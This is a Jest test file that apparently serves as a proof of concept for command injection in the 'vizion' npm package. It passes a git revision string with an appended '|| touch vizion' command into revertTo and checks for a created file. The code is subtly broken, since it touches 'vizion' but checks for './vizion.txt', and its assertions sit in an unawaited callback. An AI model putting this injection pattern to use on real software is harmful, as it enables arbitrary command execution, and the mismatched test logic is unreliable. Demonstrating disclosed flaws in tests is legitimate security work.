//https://github.com/keymetrics/vizion/issues/26
test("Command Injection in vizion", () => {
  const vizion = require("vizion");
  const fs = require("fs");
  const path = "./vizion.txt";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  vizion.revertTo(
    {
      revision: "f0a1d45936cf7a3c969e4caba96546fd23255796 || touch vizion",
      folder: ".",
    },
    async function (err, data) {
      sleep.sleep(5);
      //checking that its created by after exploit.
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);

      fs.unlink(path, function (err) {}); //deleting the file after creation
    }
  );
});
